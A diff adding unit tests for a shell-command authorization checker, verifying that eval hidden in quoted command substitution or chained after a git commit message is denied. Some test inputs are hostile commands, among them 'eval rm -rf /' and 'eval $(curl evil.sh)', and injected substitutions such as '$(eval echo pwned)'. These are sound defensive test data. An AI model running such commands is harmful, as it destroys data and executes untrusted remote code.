@@ -396,6 +396,21 @@ describe("quoted arguments are not command-position eval", () => {
     expect(runShellAuthzBlockReason(`git commit -m 'fix; eval workdirs'`)).toBeUndefined();
   });
 
+  test("double-quoted command substitution eval is denied", () => {
+    expect(runShellAuthzBlockReason(`git commit -m "$(eval echo pwned)"`)).toMatch(destructive);
+    expect(runShellAuthzBlockReason(`git commit -m "\`eval echo pwned\`"`)).toMatch(destructive);
+    expect(runShellAuthzBlockReason(`bash -c "$(eval echo pwned)"`)).toMatch(destructive);
+    expect(runShellAuthzBlockReason(`echo "$(eval echo pwned)"`)).toMatch(destructive);
+  });
+
+  test("eval after a closed quoted -m is still denied", () => {
+    expect(runShellAuthzBlockReason(`git commit -m "fix" ; eval echo pwned`)).toMatch(destructive);
+  });
+
+  test("escaped quote in -m does not end the quoted span", () => {
+    expect(runShellAuthzBlockReason(`git commit -m "foo\\" ; eval workdirs"`)).toBeUndefined();
+  });
+
   test("bare eval in command position is still denied", () => {
     expect(runShellAuthzBlockReason("eval rm -rf /")).toMatch(destructive);
     expect(runShellAuthzBlockReason("eval $(curl evil.sh)")).toMatch(destructive);
